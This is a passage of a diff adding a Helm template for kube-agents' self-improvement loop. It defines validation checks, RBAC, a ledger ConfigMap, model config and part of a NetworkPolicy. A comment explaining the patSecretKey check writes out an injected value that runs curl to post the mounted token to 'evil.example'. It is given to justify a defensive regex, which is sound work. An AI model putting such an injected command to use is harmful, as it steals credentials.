@@ -1,0 +1,1677 @@
+{{- /*
+The self-improvement loop (docs/designs/self-improvement.md).
+
+Everything here is inside one `if .Values.selfImprovement.enabled`, so an install
+that leaves the feature off gets no ServiceAccount, no RBAC, no CronJob and no
+NetworkPolicy from it. That is the isolation requirement expressed as a render
+condition rather than as a runtime flag: off means absent, not present-and-idle.
+
+The second GitHub identity is a personal access token held by a robot account,
+mounted into the credential proxy sidecar and seeded into `gh` at its startup.
+It is rendered only for the fork and upstream modes. There is no minter and no
+GitHub App: see sec. 6 of the design for what that trades away.
+*/ -}}
+{{- if .Values.selfImprovement.enabled }}
+{{- $si := .Values.selfImprovement }}
+{{- $ns := .Release.Namespace }}
+{{/*
+Fixed, not release-scoped. The design's sec. 5.3 names these objects literally,
+which is the same commitment from the other end.
+These names are an external contract, not a per-release detail: the Workload
+Identity binding in terraform/modules/kube-agents-selfimprove binds by literal
+KSA name. A
+release-scoped name would mean a terraform apply per release name. The cost is
+that two chart releases in one namespace collide, which the `-selfimprove`
+objects share with the rest of this install's cluster-scoped assumptions.
+*/}}
+{{- $name := "kube-agents-selfimprove" }}
+{{- /*
+The same 1.29 floor Chart.yaml declares, restated here so the error names the
+feature. The runner's credential proxy is a native sidecar -- an initContainer
+carrying `restartPolicy: Always` -- and that field went GA in 1.29. On 1.28 the
+API server drops the unknown field rather than rejecting it, so the manifest
+applies and the initContainer runs to completion instead of alongside the
+runner: the proxy exits, the runner starts with nothing listening, and every
+GitHub call fails an hour into the run. Silent misbehaviour is what makes this
+worth a render-time check rather than a note.
+
+Chart.yaml's `kubeVersion` refuses the same clusters today and gets there first,
+so on a 1.28 cluster it is that error you see, not this one. This check is not
+redundant for that reason: the chart floor was 1.28 until the platform agent's
+own proxy became a native sidecar, and it is a chart-wide number this feature
+does not own. Were it lowered again -- an install that drops the platform
+proxy, a revert -- the loop would go back to applying cleanly on 1.28 and
+failing an hour into the run. The floor this feature needs is stated where the
+feature is, so it cannot be moved by a decision about something else.
+*/ -}}
+{{- if not (semverCompare ">=1.29.0-0" .Capabilities.KubeVersion.Version) }}
+{{- fail (printf "selfImprovement.enabled requires Kubernetes 1.29 or later; this cluster reports %s. The loop's credential proxy is a native sidecar (an initContainer with restartPolicy: Always), which is GA from 1.29. On 1.28 the field is silently dropped and the proxy exits before the runner starts." .Capabilities.KubeVersion.Version) }}
+{{- end }}
+{{- $mode := $si.mode | default "report-only" }}
+{{- if not (has $mode (list "report-only" "fork" "upstream")) }}
+{{- fail (printf "selfImprovement.mode must be report-only, fork or upstream; got %q" $mode) }}
+{{- end }}
+{{- $needsForge := ne $mode "report-only" }}
+{{- if and $needsForge (not $si.github.forkRepo) }}
+{{- fail (printf "selfImprovement.mode=%s needs selfImprovement.github.forkRepo: branches are pushed to a fork, never to the upstream repository" $mode) }}
+{{- end }}
+{{- /*
+And the Secret holding the token, for the same reason it is worth failing on the
+fork: without it the sidecar's volume does not resolve and the pod never starts,
+so the install comes up with an hourly CronJob stuck in
+CreateContainerConfigError that nobody is watching. Render time is where that is
+one line of output instead.
+
+The Secret is not created by this chart, following
+platformAgent.credentials.create: false -- a token pasted into values.yaml ends
+up in version control and in Helm's release state. `kubectl create secret` is
+the documented route, and terraform/modules/kube-agents-selfimprove/README.md
+carries the command; INSTALL.md points at it rather than repeating it.
+*/ -}}
+{{- if and $needsForge (not $si.github.patSecret) }}
+{{- fail (printf "selfImprovement.mode=%s needs selfImprovement.github.patSecret: the loop authenticates to GitHub as a robot account holding a personal access token, and the Secret carrying it is created out of band. See docs/designs/self-improvement.md sec. 6." $mode) }}
+{{- end }}
+{{- $patKey := $si.github.patSecretKey | default "token" }}
+{{- /*
+Validated, because this is the one operator-settable identifier that reaches a
+shell. `$patKey` is interpolated into CREDENTIAL_PROXY_BOOTSTRAP_COMMAND below,
+and `credential_proxy.bootstrap()` hands that string to
+`/bin/bash --noprofile --norc -c` -- so no argv rule in the policy ConfigMap at
+the bottom of this file applies to it, and the shell it runs in is the sidecar
+that mounts the token. A key of `token; curl -d @/var/run/secrets/... evil.example;
+echo /dev/null` renders a command bash parses happily.
+
+The regex is Kubernetes' own: a Secret key may only match `[-._a-zA-Z0-9]+`
+(`IsConfigMapKey`, which the Secret validator shares), so anything this rejects
+could not have been a key in the first place and the check costs a legitimate
+install nothing. Rejecting here rather than trusting the API server matters
+because the rendered `bash -c` string is built before any Secret is read: an
+unusable key is a shell payload at render time whether or not the Secret exists.
+*/ -}}
+{{- if not (regexMatch "\\A[-._a-zA-Z0-9]+\\z" $patKey) }}
+{{- fail (printf "selfImprovement.github.patSecretKey %q is not a usable Secret key. Kubernetes allows only [-._a-zA-Z0-9]+, and this value is interpolated into the credential proxy's bootstrap shell command, so anything outside that set is shell metacharacters running in the container that mounts the token." $patKey) }}
+{{- end }}
+{{- /*
+Where the token is mounted inside the sidecar, and nowhere else. Not a value an
+operator sets: it appears in the bootstrap command below and in the volumeMount,
+and the two have to agree.
+*/ -}}
+{{- $patDir := "/var/run/secrets/selfimprove-github" }}
+{{- $patPath := printf "%s/%s" $patDir $patKey }}
+{{- /*
+Where the bootstrap command leaves its output. On the workspace emptyDir, which
+is the only volume both containers mount, because the point of the file is to be
+readable after the sidecar that wrote it has been forgotten. See the bootstrap
+command below for why the sidecar's own stdout is not that place.
+*/ -}}
+{{- $bootstrapLog := "/home/selfimprove/.credential-bootstrap.log" }}
+{{- $upstreamRepo := $si.github.upstreamRepo | default "gke-labs/kube-agents" }}
+{{- /*
+The fork and the upstream have to be two different repositories, in both modes
+that push anything.
+
+It used to be about the minter: it keyed per-repository rules by slug, the
+fork's carrying `contents: write` and the upstream's deliberately not, and one
+slug for both collapsed the pair into a push grant on the upstream. A single
+token cannot express that split at all -- it carries one permission set
+everywhere the robot account can reach -- so nothing downstream of here
+distinguishes the two repositories by grant.
+
+Two things this check is not. It is not a runtime constraint: it runs once, at
+render, over two strings, and stops nothing the pod does afterwards. The rule
+that does is `selfimprove.git-push-fork-only` in the policy ConfigMap at the
+bottom of this file, which refuses any `git push` whose remote is not the one
+named `fork`. And it is not upstream-mode-only, which it was: under
+`mode: fork` the loop pushes branches to `forkRepo` just the same, so a
+`forkRepo` equal to the upstream pushes to the upstream there too -- the exact
+outcome the paragraph above is about, in the mode nobody was checking.
+values.yaml has said "the chart refuses that" without qualification for as long
+as the field has existed; now it does.
+
+Compared case-insensitively because GitHub slugs are. `GKE-Labs/Kube-Agents`
+and `gke-labs/kube-agents` are one repository to GitHub and two strings to
+`eq`, so the guard that exists to stop a push to the upstream was one shift key
+away from waving it through.
+
+There is no configuration it costs: a pull request whose head and base are the
+same repository is what fork mode already is, and reaching that does not need
+the upstream field set.
+*/ -}}
+{{- if and $needsForge (eq (lower $si.github.forkRepo) (lower $upstreamRepo)) }}
+{{- fail (printf "selfImprovement.github.forkRepo and upstreamRepo are both %q (compared case-insensitively). They must differ in fork and upstream mode alike: branches are pushed to forkRepo, and one slug for both makes the loop push to the upstream repository. Leave upstreamRepo at its default and point forkRepo at your own fork." $upstreamRepo) }}
+{{- end }}
+{{- /*
+Where the pull request is opened, which is the fork under fork mode and the
+upstream under upstream mode. `SELFIMPROVE_UPSTREAM_REPO` names it because that
+is what the filing turn's prompt calls the base, and rendering the upstream slug
+into it under fork mode sent the turn to open a pull request against the wrong
+repository an hour into a run, on the loop's only write.
+
+It is deliberately not also the repository the run reads its source from. That
+is `SELFIMPROVE_SOURCE_REPO` below, and the two are different questions: the
+base of a pull request is a policy choice, while the source has to be a
+repository that actually holds the object the deployed image is stamped at. A
+fork does not sync itself, so a month-old one holds no such object -- codeload
+404s, the clone fails, and the run investigates with no source at all after
+paying for the fetch. One variable answering both questions is what made fork
+mode do that.
+*/ -}}
+{{- $prTarget := ternary $si.github.forkRepo $upstreamRepo (eq $mode "fork") }}
+{{- /*
+`required`, and not just for the modes that file. Every other consumer of this
+value reaches it through a template that only renders when the platform agent
+does, so an install with `platformAgent.enabled: false` and this loop switched
+on in report-only mode passed the empty string through unchallenged: the KSA
+rendered with its Workload Identity annotation omitted by the `if $project`
+guard that used to sit below, and GOOGLE_CLOUD_PROJECT rendered as "". The pod
+starts, the CronJob runs on schedule, and every Cloud Logging and Cloud Trace
+read inside it fails on an unauthenticated call -- which is four of the seven
+signal classes producing nothing, hourly, with no error anywhere that names the
+missing value.
+*/ -}}
+{{- $project := required "platformAgent.harness.projectId is required when selfImprovement.enabled: the loop reads Cloud Logging, Cloud Trace and Cloud Monitoring through Workload Identity, which is addressed by project" .Values.platformAgent.harness.projectId }}
+{{- /*
+`required` for the same reason and a sharper one. The loop's GSA holds
+`roles/monitoring.viewer`, which is a project grant -- so a metric query with no
+cluster clause reads every cluster in the project, including the clusters under
+management that this whole feature is drawn around not touching.
+
+The clause is not added by the query; it is added by
+`selfimprove_evidence.py:_metrics_filter`, which reads GKE_CLUSTER_NAME and
+returns the caller's filter unchanged when it is empty. `_is_other_cluster`, the
+client-side backstop that drops rows belonging to another cluster, short-circuits
+on the same empty string. So an install that left clusterName unset does not fail
+and does not over-match -- it silently stops scoping, and the run reads the fleet
+it is supposed to be blind to. Empty is the one value that turns the guard off,
+which is why it is refused here rather than defaulted to something.
+*/ -}}
+{{- $clusterName := required "platformAgent.harness.clusterName is required when selfImprovement.enabled: the loop's GSA holds roles/monitoring.viewer on the whole project, and the cluster name is the clause that keeps its metric queries off the clusters under management. selfimprove_evidence.py treats an empty value as no filter at all." .Values.platformAgent.harness.clusterName }}
+{{- /*
+The investigator's own GSA id, checked in every mode. GCP will not hold an
+account outside `[a-z][a-z0-9-]{4,28}[a-z0-9]`, so a longer or malformed id
+annotates the KSA for an account that cannot exist; the binding is not rejected,
+the pod starts, and every telemetry read inside it 403s an hour into a run with
+no error naming the id. Fail at render instead.
+
+There used to be a tighter 23-character cap for the fork and upstream modes,
+because the minter's account was this id plus `-minter` and the pair had to fit
+in 30. The token replaced the minter, so that account is gone and the cap with
+it: 30 applies in every mode now.
+*/ -}}
+{{- $gsaName := $si.github.gsaName | default "kubeagents-selfimprove" }}
+{{- if not (regexMatch "^[a-z][a-z0-9-]{4,28}[a-z0-9]$" $gsaName) }}
+{{- fail (printf "selfImprovement.github.gsaName %q (%d characters) is not a usable GCP service account id. It must be 6 to 30 characters, start with a lowercase letter, end with a lowercase letter or digit, and contain only lowercase letters, digits and hyphens." $gsaName (len $gsaName)) }}
+{{- end }}
+{{- /*
+The KSA the CronJob runs as. Defaulted to the literal `kubeagents-selfimprove`
+rather than to $name, which is `kube-agents-selfimprove` -- one hyphen apart,
+and the wrong one. Both values.yaml and the Terraform module's `ksa_name` carry
+the hyphenless spelling, and the Workload Identity binding is written against
+it by name, so a render that fell through to $name would produce a KSA the
+binding does not cover: the pod starts, and every Cloud Logging, Trace and
+Monitoring read inside it 403s for the rest of the install's life.
+*/ -}}
+{{- $ksaName := $si.github.ksaName | default "kubeagents-selfimprove" }}
+{{- /*
+Checked here for the reason the ledger name below is, and it bites harder. The
+value reaches five places -- the ServiceAccount, the two RoleBinding subjects,
+the Pod's serviceAccountName, and the Workload Identity member Terraform binds
+on the GCP side -- and only the first is validated by the API server, which
+takes a ServiceAccount name as a DNS-1123 subdomain. So `Bad_Name` renders a
+document the server accepts for both RoleBindings and rejects for the account
+they refer to: the install fails part-applied, with two bindings granting the
+namespace to a subject that does not exist and no error naming the typo.
+
+An unquoted YAML boolean is the other half, and the two spellings behave
+differently. `no`, `off` and `false` reach here as boolean false, which sprig's
+`default` counts as empty, so they quietly get the default name -- surprising,
+but a working install. `yes`, `on` and `true` are non-empty and come straight
+through: before the `quote` below they rendered `name: true`, a YAML boolean the
+API server rejects for the ServiceAccount and accepts for the two RoleBinding
+subjects. A bare `123` did the same as an integer. Both are legal names once
+quoted, so they are quoted rather than refused, and the check reads `printf
+"%v"` rather than assuming a string reached it.
+*/ -}}
+{{- if not (regexMatch "\\A[a-z0-9]([-a-z0-9.]*[a-z0-9])?\\z" (printf "%v" $ksaName)) }}
+{{- fail (printf "selfImprovement.github.ksaName %q is not a valid ServiceAccount name. It must be a lowercase DNS subdomain: letters, digits, `-` and `.`, starting and ending alphanumeric. Note that an unquoted YAML `yes` or `on` reaches this template as the boolean true, and renders an account literally named \"true\"." $ksaName) }}
+{{- end }}
+{{- if gt (len (printf "%v" $ksaName)) 253 }}
+{{- fail (printf "selfImprovement.github.ksaName is %d characters; a ServiceAccount name is a DNS subdomain, capped at 253." (len (printf "%v" $ksaName))) }}
+{{- end }}
+{{- /*
+`registry`, not `root`: kube-agents.imageRepository takes {repository, registry}
+and ignores anything else, so passing `root` mirrored nothing and left the
+CronJob pulling ghcr.io on an install whose every other image came from the
+mirror. Air-gapped that is an hourly ImagePullBackOff; merely mirrored, the pull
+succeeds and resolve_revision() then compares the runner's ghcr.io reference
+against the agent Deployment's mirrored one, sees two different strings, and
+refuses every run.
+*/ -}}
+{{- $registry := include "kube-agents.imageRegistry" . }}
+{{- $agentImage := include "kube-agents.imageRepository" (dict "repository" .Values.platformAgent.deployment.image.repository "registry" $registry) }}
+{{- $agentTag := .Values.platformAgent.deployment.image.tag | default .Chart.AppVersion }}
+{{- /*
+The observed Deployment. The operator names the agent Deployment
+`<PlatformAgent name>-gateway`, so this default tracks platformAgent.name rather
+than being hardcoded -- an install that renamed its agent would otherwise point
+every run at a Deployment that does not exist.
+
+Which is quieter than it sounds, and worth saying precisely. `resolve_revision`
+does not abort on a Deployment it cannot read: it records
+`image_check: "unverified: could not read the agent Deployment's image"` and
+carries on, deliberately, so the run still investigates and the fact travels
+into the brief and the ledger row. Only a *mismatch* between two images it
+actually read sets `refuse`. So the failure mode of a wrong name here is not a
+red CronJob -- it is an hourly run that costs full model spend and can never
+confirm that the source it is reading is the source the pod is running.
+*/ -}}
+{{- $observed := $si.observedDeployment | default (printf "%s-gateway" .Values.platformAgent.name) }}
+{{- /*
+Which is why `platformAgent.enabled: false` has to be answered here. This
+template renders in full without the agent -- its own KSA, its own RBAC, its own
+CronJob, none of them owned by the PlatformAgent CR -- so the loop comes up
+pointed at `<platformAgent.name>-gateway`, a Deployment this release did not
+render and nothing else is going to. Every run then takes the unverified path
+above, hourly, for the life of the install.
+
+An install that genuinely observes an agent from another release says so by
+setting `observedDeployment`, and that is the escape hatch: the guard fires only
+when the chart is both not creating an agent and not being told where one is.
+*/ -}}
+{{- if and (not .Values.platformAgent.enabled) (not $si.observedDeployment) }}
+{{- fail "selfImprovement.enabled with platformAgent.enabled: false needs selfImprovement.observedDeployment. The loop cross-checks its own image against the agent Deployment it is investigating, and this release renders no agent, so the default name (<platformAgent.name>-gateway) resolves to nothing: every run would investigate at full model spend and record image_check: unverified. Name the Deployment to observe, or leave the loop off." }}
+{{- end }}
+{{- $ledgerName := printf "%v" ($si.ledgerConfigMap | default "kube-agents-selfimprove-ledger") }}
+{{- /*
+The ledger name is a Kubernetes object name and reaches four places that must
+agree -- the ConfigMap, the Role's `resourceNames`, the RoleBinding behind it,
+and SELFIMPROVE_LEDGER_CONFIGMAP. Checked against DNS-1123 rather than left to
+the API server because two of those four are quoted strings the API server never
+validates as names: a value it rejects for the ConfigMap is still accepted in
+`resourceNames`, so the install fails on one object and silently grants nothing
+on the other.
+*/ -}}
+{{- if not (regexMatch "\\A[a-z0-9]([-a-z0-9.]*[a-z0-9])?\\z" $ledgerName) }}
+{{- fail (printf "selfImprovement.ledgerConfigMap %q is not a valid ConfigMap name. It must be a lowercase DNS subdomain: letters, digits, `-` and `.`, starting and ending alphanumeric. Note that an unquoted YAML `yes` or `on` reaches this template as the boolean true, and renders a ConfigMap literally named \"true\"." $ledgerName) }}
+{{- end }}
+{{- if gt (len $ledgerName) 253 }}
+{{- fail (printf "selfImprovement.ledgerConfigMap is %d characters; a ConfigMap name is a DNS subdomain, capped at 253. The regex above accepts any length, and the two `resourceNames` entries that carry this value are not names to the API server, so an over-long value fails on the ConfigMap alone and grants nothing." (len $ledgerName)) }}
+{{- end }}
+{{- /*
+Two families of ConfigMap name are already spoken for, and pointing the ledger
+at either hands one object to two writers.
+
+Four belong to the operator, which server-side-applies them with ForceOwnership
+on every reconcile. Point the ledger at one of them and the two writers take the
+object away from each other in a loop -- the operator restoring its rendered
+content, the runner writing counts back an hour later -- with the agent's own
+configuration as the casualty. The operator builds those four by name from the
+PlatformAgent (`buildConfigMap`, `buildSettingsConfigMap`,
+`buildFluentBitConfigMap`, `buildCredentialProxyPolicyConfigMap`).
+
+The rest belong to this chart, and that half used to be missing while the
+comment claimed the collision was checkable here. `ledgerConfigMap:
+litellm-config` rendered `name: litellm-config` twice in one output -- Helm
+applies both, last one wins -- and put the name in `resourceNames`, so the
+runner's hourly strategic-merge patch would write `data.ledger.json` into the
+model gateway's real configuration. `kube-agents-selfimprove-config`, the
+runner's own Hermes config, and the policy ConfigMap the credential proxy reads
+are the same shape. The names are spelled out rather than discovered because a
+template cannot enumerate its own siblings' output.
+*/ -}}
+{{- $reserved := list (printf "%s-config" .Values.platformAgent.name) (printf "%s-settings" .Values.platformAgent.name) (printf "%s-fluent-bit-config" .Values.platformAgent.name) (printf "%s-credential-proxy-policy" .Values.platformAgent.name) (printf "%s-config" $name) (printf "%s-credential-proxy-policy" $name) "litellm-config" "github-token-minter-config" }}
+{{- if has $ledgerName $reserved }}
+{{- fail (printf "selfImprovement.ledgerConfigMap must not be %q: that ConfigMap already has a writer -- either the operator, which force-applies it on every reconcile, or this chart, which renders it. The runner holds `patch` on whatever is named here, so a collision means the hourly ledger write lands in another component's configuration." $ledgerName) }}
+{{- end }}
+{{- /*
+An empty `signals` list is not "investigate nothing". `join "," (list)` renders
+"", the runner's `env()` treats "" as unset, and the default it falls back to is
+all seven classes -- so the one setting values.yaml calls "the cheapest way to
+cut the loop's cost" turns the cost all the way up when it is emptied. Refuse it
+here and say what to do instead; there is no spelling of "investigate nothing"
+that is not `enabled: false`.
+
+The names are checked too. A typo is the same failure wearing a different hat:
+the runner takes the list verbatim, an unknown class matches no evidence, and
+the loop quietly investigates fewer signals than the operator asked for with
+nothing in the log naming the one that vanished.
+*/ -}}
+{{- $knownSignals := list "errors" "inefficiency" "latency" "responses" "delivery" "forge" "other" }}
+{{- if not $si.signals }}
+{{- fail "selfImprovement.signals is empty, which the runner reads as unset and expands to all seven classes -- the opposite of what an empty list looks like it asks for. List the classes to investigate, or set selfImprovement.enabled: false." }}
+{{- end }}
+{{- range $si.signals }}
+{{- if not (has . $knownSignals) }}
+{{- fail (printf "selfImprovement.signals contains %q, which is not one of %s. The runner passes the list through verbatim, so an unknown class silently investigates nothing." . (join ", " $knownSignals)) }}
+{{- end }}
+{{- end }}
+{{- /*
+The default is the gateway this release renders, so it is only a default while
+the release renders one. `litellm.enabled: false` and no endpoint set points
+every run at a Service that does not exist -- and the shape of that failure is
+the reason it is refused here rather than left to fail at runtime. The CronJob
+starts on schedule, the runner does its Kubernetes and Cloud reads, and the
+first model call gets a connection refused an unknown distance into a run that
+has already spent its read budget. Hourly, with the loop's own health output
+reporting a run that started.
+
+Refused rather than defaulted for the same reason as `observedDeployment` above:
+an install running its own gateway knows where it is, and the chart does not.
+*/ -}}
+{{- if and (not .Values.litellm.enabled) (not $si.model.endpoint) }}
+{{- fail "selfImprovement.enabled with litellm.enabled: false needs selfImprovement.model.endpoint. The default endpoint is the litellm Service this release renders, and this release is not rendering one, so every run would fail its first model call part-way through -- after the read budget is spent, hourly. Name your own OpenAI-compatible endpoint, or leave the loop off." }}
+{{- end }}
+{{- $modelEndpoint := $si.model.endpoint | default (printf "http://litellm.%s.svc.cluster.local/v1" $ns) }}
+---
+# The runner's own Kubernetes identity. Not the agent's, and the difference is
+# almost entirely on the GCP side: the agent's KSA is bound to a Workload
+# Identity GSA that can reach every managed cluster, and the whole design of
+# this loop is that it holds no such thing. The Workload Identity annotation is
+# what makes that true -- the GSA behind it holds logging/trace/monitoring
+# viewer and no container.* role at all
+# (terraform/modules/kube-agents-selfimprove). On the Kubernetes side the
+# difference is narrower than it sounds: the agent's Role is namespaced too, and
+# what this one gives up is the write half of it, keeping `view` plus `patch`
+# on one ConfigMap by name.
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: {{ $ksaName | quote }}
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+  annotations:
+    iam.gke.io/gcp-service-account: {{ printf "%s@%s.iam.gserviceaccount.com" $gsaName $project }}
+---
+# Read the namespace. `view` is the upstream ClusterRole, bound with a
+# RoleBinding rather than a ClusterRoleBinding so the grant stops at this
+# namespace: the runner can see the installation it is auditing and nothing
+# else in the cluster, and nothing at all in the clusters under management.
+#
+# `view` deliberately excludes Secrets, which is the property that lets this be
+# switched on without a credential review. It also excludes pods/exec,
+# pods/attach and pods/portforward, so there is no route from a read grant to a
+# shell in the agent's pod.
+#
+# It does include pods/log, and that is the grant to weigh rather than the
+# absent ones: the agent's logs are the loop's main evidence source, and anything
+# the agent logged is readable here. Which is the same reach the loop already
+# has through Cloud Logging, so the boundary this stays inside is what the
+# agent writes down -- not the credentials it writes it with.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: {{ $name }}-view
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: view
+subjects:
+  - kind: ServiceAccount
+    name: {{ $ksaName | quote }}
+    namespace: {{ $ns }}
+---
+# The two grants `view` does not cover.
+#
+# The custom resources, because `view` aggregates only what carries the
+# `rbac.authorization.k8s.io/aggregate-to-view` label and this project's CRDs do
+# not. Reading them is most of how the loop tells what the install was asked to
+# do, as against what it did.
+#
+# And write on exactly one ConfigMap, by name. `resourceNames` is the whole
+# point: a `configmaps: [patch]` grant without it would let the runner rewrite
+# the agent's own configuration, which is the one privilege escalation this
+# design cannot tolerate.
+#
+# There is deliberately no `create`, which is the other half of that. The API
+# server ignores `resourceNames` on create -- the name is not known until the
+# request is made -- so any create grant here is a namespace-wide one, and a
+# prompt-injected investigation holding it could write a ConfigMap of its
+# choosing next to the agent's own. The chart renders the ledger ConfigMap
+# below whenever it renders the CronJob, so nothing needs to create one;
+# selfimprove_ledger.save() raises LedgerWriteError on a 404 rather than
+# falling back to a create it cannot perform.
+#
+# No `update` either, for a smaller reason of the same kind. The ledger is
+# written by exactly one call -- `api.patch_namespaced_config_map`
+# (selfimprove_ledger.py) -- and there is no `replace_namespaced_config_map`
+# anywhere in the tree, so `update` was a verb nothing exercised. An unexercised
+# verb in a grant this narrow is worth removing rather than keeping: `update`
+# replaces the whole object, which is precisely the write the `data`-less render
+# below is arranged to avoid.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: {{ $name }}
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+rules:
+  # kubeagents.x-k8s.io, not agent.kubeagents.x-k8s.io. The group is set by
+  # k8s-operator/api/v1alpha1/groupversion_info.go and appears in the CRDs under
+  # charts/kube-agents/crds/. A wrong group here does not fail validation or
+  # binding -- it grants nothing, and the loop's `k8s platformagents` and
+  # `k8s agentplugins` evidence commands 403 on every run.
+  - apiGroups: ["kubeagents.x-k8s.io"]
+    resources: ["platformagents", "platformagents/status", "agentplugins", "agentplugins/status"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: [""]
+    resources: ["configmaps"]
+    resourceNames: [{{ $ledgerName | quote }}]
+    verbs: ["get", "patch"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: {{ $name }}
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: {{ $name }}
+subjects:
+  - kind: ServiceAccount
+    name: {{ $ksaName | quote }}
+    namespace: {{ $ns }}
+---
+# The ledger. Rendered with NO `data` key on purpose: Helm's three-way merge
+# leaves a field alone when it is absent from both the old and the new manifest,
+# so the runner's writes survive every `helm upgrade`. Rendering an empty
+# `data: {}` instead would reset the occurrence counts on each upgrade, and
+# since promotions are gated on those counts, the loop would then never promote
+# anything on an install that is upgraded regularly.
+#
+# It is deliberately not referenced by the agent's Deployment. The operator
+# SHA256-hashes the ConfigMaps it owns into the agent pod template, so a ledger
+# in that set would restart the Platform Agent every hour -- the observer
+# perturbing the thing it observes, hourly, forever.
+#
+# `helm.sh/resource-policy: keep` for the same reason the `data` key is absent,
+# one turn further out. Everything else this template renders is behind
+# `selfImprovement.enabled`, so switching the loop off deletes it -- which is
+# right for a CronJob and wrong for the only durable state the feature has.
+# Turning the loop off for a fortnight to cut model spend is an ordinary thing
+# to do, and without this annotation it destroys the promotion records that
+# `gate.cooldownHours` reads: on re-enable the loop re-files findings whose pull
+# requests are still open, against a repository whose maintainers already have
+# them. The annotation costs an orphaned ConfigMap after `helm uninstall`, named
+# in the chart README so an operator who wants the state gone can delete it.
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ $ledgerName | quote }}
+  namespace: {{ $ns }}
+  annotations:
+    helm.sh/resource-policy: keep
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+---
+# The runner's Hermes managed config: the model, and nothing else.
+#
+# HERMES_MANAGED_DIR overlays this on top of the profile config baked into the
+# image (agents/selfimprove/config.yaml), which is why the model block is not in
+# that file -- it would hardcode this install's namespace into the image, the
+# way agents/cluster/config.yaml still does.
+#
+# Every scalar below is quoted, and here that is not style. This is YAML inside
+# a YAML string: Helm renders it, the API server stores it as opaque text, and
+# nothing parses it again until Hermes reads the file in the pod. A model name
+# containing `: ` makes a mapping out of a string and a name containing ` #`
+# silently truncates -- and the failure surfaces as a Hermes config error inside
+# an hourly Job, hours after the `helm upgrade` that caused it, with no line
+# connecting the two. `helm lint` cannot see it either: to the outer document
+# this is one valid multi-line string whatever is in it.
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ $name }}-config
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+data:
+  config.yaml: |
+    model:
+      provider: custom
+      model: {{ $si.model.name | default "model-default" | quote }}
+      default: {{ $si.model.name | default "model-default" | quote }}
+      base_url: {{ $modelEndpoint | quote }}
+      api_key: "none"
+{{- if $si.networkPolicy }}
+---
+# Egress only, and only to what an investigation needs: DNS, the model endpoint,
+# the Kubernetes API, the GKE metadata server for a Workload Identity token, and
+# HTTPS for the Google Cloud read APIs plus the source tarball.
+#
+# There is no ingress rule at all, which is not an omission: nothing should ever
+# connect TO the runner. A NetworkPolicy selecting a pod with no ingress rules
+# denies all ingress, so the empty list is the statement.
+#
+# What this cannot restrict is the 443 rule. Logging, Trace, Monitoring, GitHub
+# and the model all live behind addresses that are not stable CIDRs, so the
+# egress allowance is wide and the actual restriction is the IAM behind it: a
+# GSA with three viewer roles cannot write to Cloud Logging however open the
+# network is. Say that out loud rather than implying the policy is the control.
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: {{ $name }}-policy
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+spec:
+  podSelector:
+    matchLabels:
+      kubeagents.x-k8s.io/selfimprove: "true"
+  policyTypes:
+    - Ingress
+    - Egress
+  ingress: []
+  egress:
+    # DNS. Both shapes of kube-dns selector, because which one matches depends
+    # on the cluster's DNS provider -- the same belt-and-braces the minter
+    # policy uses, and for the same reason. The comment used to say that while
+    # the rule was a kube-system namespaceSelector plus a bare 0.0.0.0/0, which
+    # is a standing egress channel on port 53 to any resolver on the internet.
+    #
+    # The VIPs are listed as well as the pods because a NetworkPolicy matches
+    # the address the pod dials, and that is the Service VIP -- github-minter's
+    # policy carries the long version of this note. Both service-CIDR
+    # conventions GKE ships are covered, the same pair as the API server rule
+    # below one octet along: 34.118.224.10 on clusters created with the current
+    # default range, 10.96.0.10 on the classic one. The first is in public
+    # address space, which is what made the minter's copy of this rule reach for
+    # `0.0.0.0/0` excepting the private ranges; naming the VIP gets DNS working
+    # on a modern cluster without opening port 53 to every resolver on the
+    # internet. A cluster whose DNS VIP is neither must set
+    # selfImprovement.dnsCIDRs.
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: kube-system
+          podSelector:
+            matchLabels:
+              k8s-app: kube-dns
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: kube-system
+          podSelector:
+            matchLabels:
+              k8s-app: node-local-dns
+        - ipBlock:
+            cidr: 169.254.20.10/32
+        - ipBlock:
+            cidr: 169.254.169.254/32
+        {{- /* `default` and not `concat`, the opposite of $apiCIDRs below: the
+               two addresses here are guesses at a convention rather than
+               anything the chart looked up, and values.yaml tells an operator
+               to set this only when it has read the kube-dns Service and found
+               both wrong. Keeping a known-wrong VIP in the policy buys nothing. */}}
+        {{- range $si.dnsCIDRs | default (list "34.118.224.10/32" "10.96.0.10/32") }}
+        - ipBlock:
+            cidr: {{ . }}
+        {{- end }}
+      ports:
+        - protocol: UDP
+          port: 53
+        - protocol: TCP
+          port: 53
+    # The one in-namespace service the run actually dials: the model gateway.
+    # It used to be two -- the loop's token minter was the other, and dropping
+    # it is what removing the GitHub App bought at the network layer, since the
+    # credential now arrives on a mounted volume rather than over a Service.
